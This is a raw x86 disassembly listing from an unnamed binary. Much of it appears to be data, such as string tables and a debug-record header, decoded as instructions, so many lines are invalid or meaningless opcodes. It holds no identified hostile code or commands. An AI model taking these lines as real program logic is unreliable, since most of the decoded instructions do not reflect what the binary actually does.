  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
  433955:	dec    ebx
  433956:	pop    edi
  433957:	push   edi
  433958:	add    BYTE PTR [eax+0x0],bl
  43395b:	inc    edi
  43395c:	add    BYTE PTR [edx+0x0],al
  43395f:	pop    edi
  433960:	add    BYTE PTR [ebx],dh
  433962:	add    BYTE PTR [eax],bh
  433964:	add    BYTE PTR [ebx+0x0],cl
  433967:	xor    eax,0x33003500
  43396c:	add    BYTE PTR [eax],dh
  43396e:	add    BYTE PTR [edi+0x0],bl
  433971:	push   esp
  433972:	add    BYTE PTR [ebp+0x0],cl
  433975:	xor    BYTE PTR [eax],al
  433977:	add    BYTE PTR [eax],al
  433979:	inc    esi
  43397a:	add    BYTE PTR [eax+0x0],bl
  43397d:	xor    BYTE PTR [eax],al
  43397f:	pop    edi
  433980:	add    BYTE PTR [ecx],dh
  433982:	add    BYTE PTR [ebx+0x0],al
  433985:	xor    eax,0x5f003100
  43398a:	add    BYTE PTR [ecx+0x0],al
  43398d:	xor    eax,DWORD PTR [eax]
  43398f:	add    BYTE PTR [eax],al
  433991:	push   ebx
  433992:	add    BYTE PTR [ebx+0x0],dl
  433995:	dec    eax
  433996:	add    BYTE PTR [edi+0x0],bl
  433999:	push   esp
  43399a:	add    BYTE PTR [ebx+0x0],al
  43399d:	push   ebx
  43399e:	add    BYTE PTR [edx+0x0],dl
  4339a1:	pop    edi
  4339a2:	add    BYTE PTR [ecx+0x0],dl
  4339a5:	dec    edi
  4339a6:	add    BYTE PTR [edi+0x0],al
  4339a9:	push   ecx
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	pop    ecx
  4339ae:	add    BYTE PTR [eax],al
  4339b0:	add    BYTE PTR [edi+0x0],cl
  4339b3:	dec    edi
  4339b4:	add    BYTE PTR [ebp+0x0],dl
  4339b7:	cmp    DWORD PTR [eax],eax
  4339b9:	pop    edi
  4339ba:	add    BYTE PTR [edx],dh
  4339bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4339c0:	add    BYTE PTR ds:0x47005f00,dh
  4339c6:	add    BYTE PTR ds:0x48000000,dh
  4339cc:	add    BYTE PTR [edx+0x0],cl
  4339cf:	push   eax
  4339d0:	add    BYTE PTR [edi+0x0],bl
  4339d3:	cmp    BYTE PTR [eax],al
  4339d5:	add    BYTE PTR ss:0x55004100,dh
  4339dc:	add    BYTE PTR [edi+0x0],bl
  4339df:	push   edx
  4339e0:	add    BYTE PTR [edi],dh
  4339e2:	add    BYTE PTR [ecx+0x0],cl
  4339e5:	add    BYTE PTR [eax],al
  4339e7:	inc    esp
  4339e8:	add    BYTE PTR [ecx+0x0],dl
  4339eb:	inc    edx
  4339ec:	add    BYTE PTR [edi+0x0],bl
  4339ef:	push   ecx
  4339f0:	add    BYTE PTR [ecx+0x0],bl
  4339f3:	dec    edi
  4339f4:	add    BYTE PTR [eax+0x0],dl
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	dec    edx
  4339fa:	add    BYTE PTR [ecx+0x0],dl
  4339fd:	inc    esp
  4339fe:	add    BYTE PTR [edi+0x0],bl
  433a01:	dec    edx
  433a02:	add    BYTE PTR [eax],dh
  433a04:	add    BYTE PTR [ecx],dh
  433a06:	add    BYTE PTR [ebx+0x0],dl
  433a09:	push   ecx
  433a0a:	add    BYTE PTR [ecx],dh
  433a0c:	add    BYTE PTR [edi+0x0],bl
  433a0f:	push   edi
  433a10:	add    BYTE PTR [eax],al
  433a12:	add    BYTE PTR [ebx+0x0],cl
  433a15:	pop    edx
  433a16:	add    BYTE PTR [esi],dh
  433a18:	add    BYTE PTR [edi+0x0],bl
  433a1b:	inc    ebx
  433a1c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  433a20:	add    BYTE PTR [edi+0x0],bl
  433a23:	push   edi
  433a24:	add    BYTE PTR [ebx],dh
  433a26:	add    BYTE PTR [esi+0x0],cl
  433a29:	push   ebp
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	dec    edx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],dl
  433a33:	aaa    
  433a34:	add    BYTE PTR [eax],bh
  433a36:	add    BYTE PTR [edi+0x0],bl
  433a39:	pop    eax
  433a3a:	add    BYTE PTR [edi+0x0],cl
  433a3d:	inc    edi
  433a3e:	add    BYTE PTR [edi+0x0],bl
  433a41:	xor    al,0x0
  433a43:	push   eax
  433a44:	add    BYTE PTR [ecx+0x0],cl
  433a47:	push   ebp
  433a48:	add    BYTE PTR [eax],al
  433a4a:	add    BYTE PTR [edi+0x0],dl
  433a4d:	push   esp
  433a4e:	add    BYTE PTR [ebx+0x0],cl
  433a51:	add    BYTE PTR [eax],al
  433a53:	add    BYTE PTR [edx+0x53],dl
  433a56:	inc    esp
  433a57:	push   ebx
  433a58:	push   0xfffffffa
  433a5a:	mov    ch,0xb9
  433a5c:	mov    edi,0xbd489fd5
  433a61:	loope  0x4339f2
  433a63:	sub    eax,0xf5797290
  433a68:	sbb    eax,DWORD PTR [eax]
  433a6a:	add    BYTE PTR [eax],al
  433a6c:	push   esp
  433a6d:	cmp    bl,BYTE PTR [ecx+edi*2+0x69]
  433a71:	addr16 push edi
  433a73:	bound  bx,DWORD PTR [edx+0x45]
  433a77:	outs   dx,BYTE PTR ds:[esi]
  433a78:	pop    esp
  433a79:	je     0x433aee
  433a7b:	ja     0x433abe
  433a7d:	imul   edx,DWORD PTR [ecx+esi*2+0x4d],0x63455c61
  433a85:	js     0x433af6
  433a87:	jp     0x433af8
  433a89:	jns    0x433aef
  433a8b:	jp     0x433af5
  433a8d:	je     0x433af3
  433a8f:	jp     0x433af3
  433a91:	cs jo  0x433af8
  433a94:	bound  eax,QWORD PTR [eax]
	...
